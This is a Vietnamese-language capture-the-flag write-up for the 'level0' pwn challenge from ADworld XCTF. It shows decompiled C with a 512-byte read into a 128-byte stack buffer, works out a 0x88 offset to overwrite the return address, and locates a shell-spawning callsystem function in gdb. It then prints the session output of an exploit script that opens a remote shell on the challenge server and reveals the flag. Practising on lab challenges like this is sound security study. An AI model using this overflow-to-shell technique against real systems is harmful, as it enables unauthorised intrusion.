# Level 0

```c
#include<stdio.h>

int callsystem()
{
  return system("/bin/sh");
}

ssize_t vulnerable_function()
{
  char buf[128]; // [rsp+0h] [rbp-80h] BYREF

  return read(0, buf, 0x200uLL);
}

int __cdecl main(int argc, const char **argv, const char **envp)
{
  write(1, "Hello, World\n", 0xDuLL);
  return vulnerable_function(1LL);
}
```

Kiếm tra các flag secure trước.

```
l1j9m4 in ~/0_PWNable/ADworld_XCTF/Exersice/8_level0 λ checksec level0 
[*] '/home/l1j9m4/0_PWNable/ADworld_XCTF/Exersice/8_level0/level0'
    Arch:     amd64-64-little
    RELRO:    No RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
```

Đây là một bài khá đơn giản `stack buffer overflow`, mảng kí tự `buf` khai báo có 128 kí tự trong function `vulnerable_function()` nhưng hàm read đọc được 0x200 = 512 kí tự input và không có `canary`  => có thể `stack buffer overflow` ghi đè `return address`.

Trong các hàm của chương trình có sẵn hàm `callsystem` có thể thực thi lấy shell tương tác với server, bây giờ ta cần đi tìm `offset` và địa chỉ hàm `callsystem`.

 +) Địa chỉ của `buf` nằm ở `[rbp-80h]` cộng thêm 0x8 ghi đè `rbp` nữa là đến địa chỉ `return address` => offset = 0x80 + 0x8 = 0x88. 

 +) Tìm địa chỉ `callsystem` qua `gdb`.

```
l1j9m4 in ~/0_PWNable/ADworld_XCTF/Exersice/8_level0 λ gdb -q ./level0
pwndbg: loaded 198 commands. Type pwndbg [filter] for a list.
pwndbg: created $rebase, $ida gdb functions (can be used with print/break)
Reading symbols from ./level0...
(No debugging symbols found in ./level0)
pwndbg> p callsystem
$1 = {<text variable, no debug info>} 0x400596 <callsystem>
```

Tiến hành viết file [exploit.py](exploit.py) và khai thác:

```
l1j9m4 in ~/0_PWNable/ADworld_XCTF/Exersice/8_level0 λ python2 exploit.py 
[+] Opening connection to 111.200.241.244 on port 57359: Done
[*] Switching to interactive mode
$ ls
bin
dev
flag
level0
lib
lib32
lib64
$ cat flag
cyberpeace{6b5deeebe3e4c0810b320cdab5e8040e}
$  
```
